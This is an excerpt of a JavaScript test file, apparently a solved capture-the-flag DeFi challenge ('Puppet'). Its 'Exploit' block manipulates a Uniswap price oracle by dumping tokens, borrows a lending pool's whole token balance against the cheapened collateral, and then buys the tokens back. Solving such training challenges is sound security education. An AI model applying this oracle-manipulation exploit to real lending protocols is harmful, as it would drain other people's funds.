...
describe('[Challenge] Puppet', function () {
  ...
  before(async function () {
    ...
    expect(await this.uniswapExchange.getTokenToEthInputPrice(ethers.utils.parseEther('1'), { gasLimit: 1e6 })).to.be.eq(
      calculateTokenToEthInputPrice(ethers.utils.parseEther('1'), UNISWAP_INITIAL_TOKEN_RESERVE, UNISWAP_INITIAL_ETH_RESERVE)
    )
    ...
    expect(await this.lendingPool.calculateDepositRequired(ethers.utils.parseEther('1'))).to.be.eq(ethers.utils.parseEther('2'))

    expect(await this.lendingPool.calculateDepositRequired(POOL_INITIAL_TOKEN_BALANCE)).to.be.eq(POOL_INITIAL_TOKEN_BALANCE.mul('2'))
  })

  it('Exploit', async function () {
    /** CODE YOUR EXPLOIT HERE */
    const deadline = async () => (await ethers.provider.getBlock('latest')).timestamp * 2
    await this.token.connect(attacker).approve(this.uniswapExchange.address, ATTACKER_INITIAL_TOKEN_BALANCE)
    await this.uniswapExchange.connect(attacker).tokenToEthSwapInput(ATTACKER_INITIAL_TOKEN_BALANCE, 1, await deadline())
    await this.lendingPool.connect(attacker).borrow(POOL_INITIAL_TOKEN_BALANCE, {
      value: await this.lendingPool.calculateDepositRequired(POOL_INITIAL_TOKEN_BALANCE),
    })
    await this.uniswapExchange.connect(attacker).ethToTokenSwapOutput(ATTACKER_INITIAL_TOKEN_BALANCE, await deadline(), {
      value: await this.uniswapExchange.getEthToTokenOutputPrice(ATTACKER_INITIAL_TOKEN_BALANCE, { gasLimit: 1e6 }),
    })
  })
